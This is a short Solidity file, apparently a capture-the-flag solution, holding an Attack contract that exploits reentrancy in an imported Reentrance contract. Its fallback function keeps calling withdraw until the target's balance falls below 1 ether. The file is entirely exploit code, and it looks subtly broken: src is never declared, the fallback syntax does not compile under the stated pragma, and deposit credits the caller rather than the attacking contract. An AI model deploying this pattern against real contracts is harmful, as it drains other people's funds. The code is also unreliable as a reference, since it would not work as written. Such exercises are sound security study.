// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract Attack {
    constructor(address _src) {
        src = Reentrance(_src);
    }

    function deposit() public payable {
        src.donate.value(msg.value)(msg.sender);
    }

    function attack() public {
        src.withdraw(1 ether);
    }

    function() payable {
        if (address(src).balance >= 1 ether) {
            src.withdraw(1 ether);
        }
    }
}
